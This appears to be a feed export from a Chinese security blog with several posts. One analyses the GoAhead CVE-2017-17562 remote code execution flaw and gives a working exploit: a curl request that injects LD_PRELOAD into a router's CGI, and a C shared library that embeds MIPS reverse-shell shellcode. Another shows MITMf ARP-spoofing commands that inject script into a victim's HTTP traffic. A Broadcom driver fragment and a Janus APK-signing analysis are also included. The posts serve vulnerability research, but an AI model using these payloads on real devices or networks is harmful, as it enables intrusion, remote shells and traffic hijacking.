</div><div class="line">    <span class="function"><span class="title">v7</span> = t-&gt;</span>field_18;    </div><div class="line">    <span class="function"><span class="title">v8</span> = &amp;t-&gt;</span>field_8;    </div><div class="line">    <span class="function"><span class="title">if</span> ( &amp;t-&gt;</span>field_8 == v7 ) &#123;</div><div class="line">      ... </div><div class="line">    &#125; <span class="keyword">else</span> &#123;      </div><div class="line">      <span class="function"><span class="title">v9</span> = t-&gt;</span>field_1c;      </div><div class="line">      <span class="function"><span class="title">v7</span>-&gt;</span>field_14 = v9;      </div><div class="line">      *(v9 + <span class="number">16</span>) = v7;      </div><div class="line">      <span class="keyword">if</span> ( *v3 == v8 ) &#123;        </div><div class="line">        <span class="function"><span class="title">v7</span>-&gt;</span>field_18 = v3; </div><div class="line">      &#125;    </div><div class="line">    &#125;    </div><div class="line">    <span class="function"><span class="title">t</span>-&gt;</span>field_20 = <span class="number">0</span>;  </div><div class="line">  &#125;  </div><div class="line">  j_restore_cpsr(prev_cpsr);  </div><div class="line">  return <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这部分代码是在linux内核里，初步分析是wifi驱动管理帧数据包发送过程，结合研究固件的源码中解析数据包的过程一起看，差不多整个wifi连接过程数据包的处理流程就出来了。接下来的工作，一个是固件地址爆破，还有一个是写exp利用漏洞。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> 802.11协议帧格式 ：<a href="http://blog.csdn.net/u012570105/article/details/51785452" rel="external nofollow noopener noreferrer" target="_blank">http://blog.csdn.net/u012570105/article/details/51785452</a></p>
<p> <a href="http://note.youdao.com/noteshare?id=1966431935077db30135e04ba4bb80a6&amp;sub=C682C939E8AD4869B8C877E0CA546A24" rel="external nofollow noopener noreferrer" target="_blank">相关代码参考</a> ：</p>
<blockquote>
<p>cmm.c :主要是wifi驱动发送管理帧数据包流程</p>
<p>wl_linux.h : wl_timer结构体参考</p>
<p>wlan.h:</p>
</blockquote>
<pre><code>/* Frame Subtype */
#define ZM_WLAN_FRAME_TYPE_ASOCREQ          0x00
#define ZM_WLAN_FRAME_TYPE_ASOCRSP          0x10
#define ZM_WLAN_FRAME_TYPE_REASOCREQ        0x20
#define ZM_WLAN_FRAME_TYPE_REASOCRSP        0x30
#define ZM_WLAN_FRAME_TYPE_PROBEREQ         0x40
#define ZM_WLAN_FRAME_TYPE_PROBERSP         0x50
</code></pre><blockquote>
<p>wlc_alloc.c :wlc_bsscfg_malloc结构体</p>
<p>wlc_bsscfg.h : wlc_pm_st 结构体参考</p>
<p>wlc.c:部分解析管理帧可以根据关键字FC_ASSOC_RESP来定位看</p>
</blockquote>
<p>​        </p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;切入点&quot;&gt;&lt;a href=&quot;#切入点&quot; class=&quot;headerlink&quot; title=&quot;切入点&quot;&gt;&lt;/a&gt;切入点&lt;/h2&gt;&lt;p&gt;从解析wme信标帧开始&lt;br&gt;参考：&lt;a href=&quot;http://www.freebuf.com/vuls/142099.html
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Poc" scheme="http://www.future-sec.com/tags/Poc/"/>
    
      <category term="BROADCOM WI-FI" scheme="http://www.future-sec.com/tags/BROADCOM-WI-FI/"/>
    
  </entry>
  
  <entry>
    <title>GoAhead远程代码执行漏洞(CVE-2017-17562)分析及实战</title>
    <link href="http://www.future-sec.com/GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html"/>
    <id>http://www.future-sec.com/GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html</id>
    <published>2017-12-25T16:00:00.000Z</published>
    <updated>2018-06-29T08:59:11.358Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要分析了该漏洞详情，并在某款路由器上成功复现，反弹shell。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>   这个漏洞出现在goahead/src/cgi.c:cgihandler函数中，它使用http请求参数中的键值对来初始化新进程的envp参数，在此处只对“REMOTE_HOST”和“HTTP_AUTHORIZATION”参数进行了判断，其他参数全部默认信任。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137816099569.jpg" alt=""></p>
<p>随后，该函数又将子进程标准输入输出指定到了一个临时文件，而这个临时文件是由post请求的数据部分初始化的，最后launchCgi函数使用从http请求中得到的参数和标准输入输出创建了cgi脚本进程。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137816744632.jpg" alt=""></p>
<p>查看goahead的elf header可以得到其interp段依赖链接器“/lib64/ld-linux-x86-64.so.2”，动态链接器是在链接过程中最先运行的代码，它用来加载目标程序的共享库和符号表。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137935699186.jpg" alt=""></p>
<p>在链接器链接过程中会根据环境变量的值进行不同的操作，其中LD_PRELOAD变量可以指定一个共享库列表，链接器会优先加载此列表中共享库。<br>如果我们在http请求中指定LD_PRELOAD环境变量，此变量将被当作启动cgi脚本的参数传递给链接器，从而可以在cgi脚本启动之前执行任意.so文件，由于post请求中的数据被保存到/tmp文件夹中的一个临时文件中，而launchCgi函数又将cgi脚本的标准输入输出指定到了该临时文件，因此我们可以远程向目标写入一个.so文件，并将LD_PRELOAD指定为“/proc/self/fd/0”来间接引用post请求数据创建的临时文件，从而在目标系统上执行任意代码。</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="调试设备"><a href="#调试设备" class="headerlink" title="调试设备"></a>调试设备</h3><p>为了验证该漏洞的真实危害性，找了B-LINK的一款路由器来做测试，首先通过路由器上的UART串口，进入路由器的调试窗口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/IMG_2461.jpg" alt="IMG_2461"></p>
<p>查看web server 是否 goahead 并且有cgi程序。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/debug.jpg" alt="debug"></p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>有四个cgi文件，找到一个能使用的upload_settings.cgi(需要登陆）</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137864957443.jpg" alt=""></p>
<p>此路由器的系统为 mipsel，原作者没有给出mips小端格式的测试so，使用mipsel交叉编译Buildroot编译一个</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">pentest<span class="variable">@ubuntu</span><span class="symbol">:~/buildroot</span><span class="variable">$ </span>cat   mipsel-hw.c</div><div class="line"><span class="comment">#include &lt;unistd.h&gt;</span></div><div class="line"></div><div class="line">static void before_main(void) __attribute_<span class="number">_</span>((constructor));</div><div class="line"></div><div class="line">static void before_main(void)</div><div class="line">&#123;</div><div class="line">    write(<span class="number">1</span>, <span class="string">"Hello: World!\n"</span>, <span class="number">14</span>);</div><div class="line">&#125;</div><div class="line">pentest<span class="variable">@ubuntu</span><span class="symbol">:~/buildroot</span><span class="variable">$ </span>./mipsel-linux-gcc -shared -fPIC  mipsel-hw.c -o mipsel-hw.so</div><div class="line">pentest<span class="variable">@ubuntu</span><span class="symbol">:~/buildroot</span><span class="variable">$ </span>file mipsel-hw.so</div><div class="line">mipsel-hw.<span class="symbol">so:</span> ELF <span class="number">32</span>-bit LSB shared object, MIPS, MIPS32 version <span class="number">1</span> (SYSV), dynamically linked, <span class="keyword">not</span> stripped</div></pre></td></tr></table></figure>
<p>测试</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -X POST   -b  <span class="string">"user=admin;platform=0"</span>  --data-binary <span class="meta">@payloads</span><span class="regexp">/mipsel-hw.so   http:/</span><span class="regexp">/192.168.16.1/</span>cgi-bin<span class="regexp">/upload_settings.cgi?LD_PRELOAD=/</span>proc<span class="regexp">/self/</span>fd/<span class="number">0</span> -i</div></pre></td></tr></table></figure>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137866081821.jpg" alt=""></p>
<p>回显成功，说明漏洞存在。</p>
<h3 id="生成-payload"><a href="#生成-payload" class="headerlink" title="生成 payload"></a>生成 payload</h3><p>使用routesplite 生成一个mipsel 下的reverse_tcp shellcode 。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137880896364.jpg" alt=""></p>
<p>写入动态链接库中</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">unsigned char sc[] = &#123;</div><div class="line">    "<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>04<span class="symbol">\x</span>28<span class="symbol">\x</span>a6<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>11<span class="symbol">\x</span>11<span class="symbol">\x</span>04"</div><div class="line">    "<span class="symbol">\x</span>28<span class="symbol">\x</span>a6<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>fd<span class="symbol">\x</span>ff<span class="symbol">\x</span>0c<span class="symbol">\x</span>24<span class="symbol">\x</span>27<span class="symbol">\x</span>20"</div><div class="line">    "<span class="symbol">\x</span>80<span class="symbol">\x</span>01<span class="symbol">\x</span>a6<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>fd<span class="symbol">\x</span>ff<span class="symbol">\x</span>0c<span class="symbol">\x</span>24<span class="symbol">\x</span>27"</div><div class="line">    "<span class="symbol">\x</span>20<span class="symbol">\x</span>80<span class="symbol">\x</span>01<span class="symbol">\x</span>27<span class="symbol">\x</span>28<span class="symbol">\x</span>80<span class="symbol">\x</span>01<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>06<span class="symbol">\x</span>28<span class="symbol">\x</span>57<span class="symbol">\x</span>10<span class="symbol">\x</span>02<span class="symbol">\x</span>24"</div><div class="line">    "<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>44<span class="symbol">\x</span>30<span class="symbol">\x</span>c9<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09"</div><div class="line">    "<span class="symbol">\x</span>01<span class="symbol">\x</span>c9<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>15<span class="symbol">\x</span>b3<span class="symbol">\x</span>05<span class="symbol">\x</span>3c<span class="symbol">\x</span>02<span class="symbol">\x</span>00"</div><div class="line">    "<span class="symbol">\x</span>a5<span class="symbol">\x</span>34<span class="symbol">\x</span>f8<span class="symbol">\x</span>ff<span class="symbol">\x</span>a5<span class="symbol">\x</span>af<span class="symbol">\x</span>10<span class="symbol">\x</span>67<span class="symbol">\x</span>05<span class="symbol">\x</span>3c<span class="symbol">\x</span>c0<span class="symbol">\x</span>a8<span class="symbol">\x</span>a5<span class="symbol">\x</span>34<span class="symbol">\x</span>fc"</div><div class="line">    "<span class="symbol">\x</span>ff<span class="symbol">\x</span>a5<span class="symbol">\x</span>af<span class="symbol">\x</span>f8<span class="symbol">\x</span>ff<span class="symbol">\x</span>a5<span class="symbol">\x</span>23<span class="symbol">\x</span>ef<span class="symbol">\x</span>ff<span class="symbol">\x</span>0c<span class="symbol">\x</span>24<span class="symbol">\x</span>27<span class="symbol">\x</span>30<span class="symbol">\x</span>80<span class="symbol">\x</span>01"</div><div class="line">    "<span class="symbol">\x</span>4a<span class="symbol">\x</span>10<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>62<span class="symbol">\x</span>69<span class="symbol">\x</span>08<span class="symbol">\x</span>3c<span class="symbol">\x</span>2f<span class="symbol">\x</span>2f<span class="symbol">\x</span>08"</div><div class="line">    "<span class="symbol">\x</span>35<span class="symbol">\x</span>ec<span class="symbol">\x</span>ff<span class="symbol">\x</span>a8<span class="symbol">\x</span>af<span class="symbol">\x</span>73<span class="symbol">\x</span>68<span class="symbol">\x</span>08<span class="symbol">\x</span>3c<span class="symbol">\x</span>6e<span class="symbol">\x</span>2f<span class="symbol">\x</span>08<span class="symbol">\x</span>35<span class="symbol">\x</span>f0<span class="symbol">\x</span>ff"</div><div class="line">    "<span class="symbol">\x</span>a8<span class="symbol">\x</span>af<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>07<span class="symbol">\x</span>28<span class="symbol">\x</span>f4<span class="symbol">\x</span>ff<span class="symbol">\x</span>a7<span class="symbol">\x</span>af<span class="symbol">\x</span>fc<span class="symbol">\x</span>ff<span class="symbol">\x</span>a7<span class="symbol">\x</span>af<span class="symbol">\x</span>ec"</div><div class="line">    "<span class="symbol">\x</span>ff<span class="symbol">\x</span>a4<span class="symbol">\x</span>23<span class="symbol">\x</span>ec<span class="symbol">\x</span>ff<span class="symbol">\x</span>a8<span class="symbol">\x</span>23<span class="symbol">\x</span>f8<span class="symbol">\x</span>ff<span class="symbol">\x</span>a8<span class="symbol">\x</span>af<span class="symbol">\x</span>f8<span class="symbol">\x</span>ff<span class="symbol">\x</span>a5<span class="symbol">\x</span>23"</div><div class="line">    "<span class="symbol">\x</span>ec<span class="symbol">\x</span>ff<span class="symbol">\x</span>bd<span class="symbol">\x</span>27<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>06<span class="symbol">\x</span>28<span class="symbol">\x</span>ab<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09"</div><div class="line">    "<span class="symbol">\x</span>01"</div><div class="line">&#125;;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">static void before_main(void) __attribute__((constructor));</div><div class="line"></div><div class="line">static void before_main(void)</div><div class="line">&#123;</div><div class="line">    void(*s)(void);</div><div class="line">    s = sc;</div><div class="line">    s();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Buildroot编译</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./mipsel-linux-gcc -shared -fPIC mipsel-<span class="built_in">reverse</span>-tcp.<span class="built_in">c</span> -o mipsel-<span class="built_in">reverse</span>-tcp.so</div></pre></td></tr></table></figure>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>本地 nc 监听 5555 端口，把生成的so文件post到目标</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -X POST   -b  <span class="string">"user=admin;platform=0"</span>  --data-binary <span class="meta">@payloads</span><span class="regexp">/mipsel-reverse-tcp.so   http:/</span><span class="regexp">/192.168.16.1/</span>cgi-bin<span class="regexp">/upload_settings.cgi?LD_PRELOAD=/</span>proc<span class="regexp">/self/</span>fd/<span class="number">0</span></div></pre></td></tr></table></figure>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137897078140.jpg" alt=""></p>
<p>成功反弹shell<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137898902411.jpg" alt=""></p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol>
<li>在挖掘IOT设备应用层漏洞时，也需要去关注系统组件的安全。</li>
<li>如果goahead 的cgi 程序无需登录可以访问，可以直接配合csrf 打内网。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li>Remote LD_PRELOAD Exploitation   <a href="https://www.elttam.com.au/blog/goahead" rel="external nofollow noopener noreferrer" target="_blank">https://www.elttam.com.au/blog/goahead</a></li>
<li>routesplite  <a href="https://github.com/reverse-shell/routersploit" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/reverse-shell/routersploit</a></li>
<li>硬件调试  <a href="http://future-sec.com/iot-security-hardware-debuging.html" rel="external nofollow noopener noreferrer" target="_blank">http://future-sec.com/iot-security-hardware-debuging.html</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="goahead" scheme="http://www.future-sec.com/tags/goahead/"/>
    
  </entry>
  
  <entry>
    <title>使用MITMF中间人攻击非80端口的HTTP</title>
    <link href="http://www.future-sec.com/using-MITMF-attack-not-80-port-http.html"/>
    <id>http://www.future-sec.com/using-MITMF-attack-not-80-port-http.html</id>
    <published>2017-12-20T16:00:00.000Z</published>
    <updated>2018-06-29T09:01:10.244Z</updated>
    
    <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在实际使用中，发现一个问题，无法劫持修改非80端口 HTTP数据，例如注入js 替换字符串。<br>例如注入一段js</p>
<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">sudo </span> <span class="string">python </span><span class="string">mitmf.</span><span class="string">py </span> -i <span class="string">wlan0 </span><span class="built_in">--spoof</span> <span class="built_in">--arp</span> <span class="built_in">--target</span>  <span class="string">172.</span><span class="string">18.</span><span class="string">219.</span>3 <span class="built_in">--gateway</span>  <span class="string">172.</span><span class="string">18.</span><span class="string">219.</span>1  <span class="built_in">--inject</span> <span class="built_in">--html-payload</span> <span class="string">'&lt;script&gt;alert(0)&lt;/script&gt;'</span></div></pre></td></tr></table></figure>
<p>victim 访问<br><a href="http://yaseng.org/project" rel="external nofollow noopener noreferrer" target="_blank">http://yaseng.org/project</a></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129397954576.jpg" alt=""></p>
<p>访问非80端口的http web<br><a href="http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml" rel="external nofollow noopener noreferrer" target="_blank">http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml</a><br>无任何提示  </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129398489571.jpg" alt=""></p>
<p>attack 端</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/Screenshot35.jpg" alt="img"></p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>简单看了一下代码<br>MITMf/core/utils.py   line:84</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">def HTTP(self, http_redir_port):</div><div class="line">    <span class="built_in">log</span>.<span class="built_in">debug</span>(<span class="string">"Setting iptables HTTP redirection rule from port 80 to &#123;&#125;"</span>.<span class="built_in">format</span>(http_redir_port))</div><div class="line">    <span class="built_in">os</span>.system(<span class="string">'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port &#123;&#125;'</span>.<span class="built_in">format</span>(http_redir_port))</div></pre></td></tr></table></figure>
<p>iptables 把80端口的mitmf 监听的10000端口，很显然，需要劫持哪个端口，加一条规则就行了。<br>例如 </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo  iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --destination-port 8080 -j REDIRECT --to-port  10000</div></pre></td></tr></table></figure>
<p>attack</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/Screenshot36.jpg" alt="mg"><br>victim<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129405294732.jpg" alt=""></p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>使用mitmf 来绕过HSTS站点抓取登陆明文  <a href="http://yaseng.org/hsts-bypass-with-mitmf.html" rel="external nofollow noopener noreferrer" target="_blank">http://yaseng.org/hsts-bypass-with-mitmf.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h2&gt;&lt;p&gt;MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。&lt;/p&gt;
&lt;h2 id=&quot;问题&quot;&gt;&lt;a hre
    
    </summary>
    
      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://www.future-sec.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="MITMf" scheme="http://www.future-sec.com/tags/MITMf/"/>
    
  </entry>
  
  <entry>
    <title>Janus漏洞(CVE-2017-13156)分析</title>
    <link href="http://www.future-sec.com/Janus-CVE-2017-13156-analysis.html"/>
    <id>http://www.future-sec.com/Janus-CVE-2017-13156-analysis.html</id>
    <published>2017-12-20T16:00:00.000Z</published>
    <updated>2018-06-29T08:59:10.780Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Android系统要求每一个Android应用程序必须要经过数字签名才能够安装到系统中，也就是说如果一个Android应用程序没有经过数字签名，是没有办法安装到系统中的。Android通过数字签名来标识应用程序的作者和在应用程序之间建立信任关系，不是用来决定最终用户可以安装哪些应用程序。这个数字签名由应用程序的作者完成，并不需要权威的数字证书签名机构认证，它只是用来让应用程序包自我认证的。然而Google在本月4日发布的Android安全公告中编号为CVE-2017-13156，这个漏洞被称为Janus漏洞，利用该漏洞可修改app而不影响原始签名。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Android-app签名校验简单介绍"><a href="#Android-app签名校验简单介绍" class="headerlink" title="Android app签名校验简单介绍"></a>Android app签名校验简单介绍</h3><p>在Android源码中“frameworks/base/core/java/android/content/pm/PackageParser.java”中。PackageParser类的collectCertificates方法会对APK进行签名校验，并且遍历APK中的所有文件，对每个文件进行校验。下面是该方法的源码：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image002.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image004.jpg" alt="img"><br>APK是一个ZIP格式的文件，因此使用ZIP相关的类进行读写。在上面代码中调用了loadCertificates，这个方法会返回一个二维数组，当APK中的文件签名校验失败，loadCertificates方法会返回一个空数组（可能是null，可能是数组长度为0），那么依照上面代码的逻辑如果数组为空则会抛出异常。<br>loadCertificates方法的代码见下：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image006.jpg" alt="img"><br>其中is是JarFile.JarFileInputStream类的对象。loadCertificates调用了readFullyIgnoringContents，在readFullyIgnoringContents中会调用JarFile.JarFileInputStream.read（JarFile类在“libcore/luni/src/main/java/java/util/jar/JarFile.java”文件中）<br>读取APK中一项数据，在read方法中会校验读取到的数据项的签名，如果签名校验失败，则会抛出SecurityException类型的异常，即签名校验失败。<br>上面代码调用了StrictJarFile.getCertificateChains方法，在/ libcore / luni / src / main / java / java / util / jar / StrictJarFile.java里面。下面是它的代码：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image007.jpg" alt="img"><br>上面的isSigned在下面的代码里面获取的：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image009.jpg" alt="img"><br>当证书读取成功，而且APK经过了签名，isSigned为true。<br>回到StrictJarFile.getCertificateChains中，当isSigned为true时会调用JarVerifier.getCertificateChains方法，下面是它的代码：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image010.jpg" alt="img"><br>verifiedEntries的声明：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image012.jpg" alt="img"><br>verifiedEntries是一个键值对，键是APK中经过了签名的文件名，如：classes.dex文件，值是证书数组。如果向已经签过名的APK中新添加一个文件然后安装这个APK，当程序逻辑执行到JarVerifier.getCertificateChains中时，在verifiedEntries里面无法找到新添加的文件名（因为这个新文件是在APK签名之后添加），那么JarVerifier.getCertificateChains方法将返回null。<br>以上就是整个对于app签名的简单分析。</p>
<h3 id="签名方案"><a href="#签名方案" class="headerlink" title="签名方案"></a>签名方案</h3><p>参考google官方文档获得:<br>APK 签名方案<br>Android 支持两种应用签名方案，一种是基于 JAR 签名的方案（v1 方案），另一种是 Android Nougat (Android 7.0) 中引入的 APK 签名方案 v2（v2 方案）。<br>JAR 签名（v1 方案）<br>v1 签名并非保护整个apk文件，例如 ZIP 元数据就不受保护。再者，APK 验证程序需要处理大量不可信（尚未经过验证）的数据结构，而不受签名保护的数据不在处理的行列中。这会导致相当大的受攻击面。此外，APK 验证程序必须解压所有已压缩的条目，而这需要花费更多时间和内存。为了解决这些问题，Android 7.0 中引入了 APK 签名方案 v2。<br>APK 签名方案 v2（v2 方案）<br>Android 7.0 中引入了 APK 签名方案 v2（v2 方案）。该方案会对 APK 的内容进行hash处理和签名，然后将生成的“APK 签名分块”插入到 APK 中。<br>在验证期间，v2 方案会将 APK 文件视为 Blob，并对整个文件进行签名检查。对 APK 进行的任何修改（包括对 ZIP 元数据进行的修改）都会使 APK 签名作废。这种形式的 APK 验证不仅速度要快得多，而且能够发现更多种未经授权的修改。<br>同时，新的签名格式向后兼容，使用这种新格式签名的 APK（必须也使用v1） 可在更低版本的 Android 设备上进行安装（会直接忽略添加到 APK 的额外数据）。</p>
<h3 id="apk签名校验方式"><a href="#apk签名校验方式" class="headerlink" title="apk签名校验方式"></a>apk签名校验方式</h3><p>为了提高兼容性，应同时采用 v1 和 v2 这两种方案对应用进行签名。与只使用v1 方案签名的应用相比，经过 v2 方案签名的应用能够更快速地安装到 Android Nougat 以及更高版本的设备上。但是更低版本的 Android 平台会忽略 v2 签名，这就需要应用包含 v1 签名。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image014.jpg" alt="img"><br>验证程序会对照存储在“APK 签名分块”中的 v2 签名对 APK 的全文件hash进行验证。该hash涵盖除“APK 签名分块”（其中包含 v2 签名）之外的所有内容。在“APK 签名分块”以外对 APK 进行的任何修改都会使 APK 的 v2 签名作废。v2 签名被删除的 APK 也会被拒绝，因为 v1 签名指明相应 APK 带有 v2 签名，所以 Android Nougat 及更高版本会拒绝使用 v1 签名验证 APK。</p>
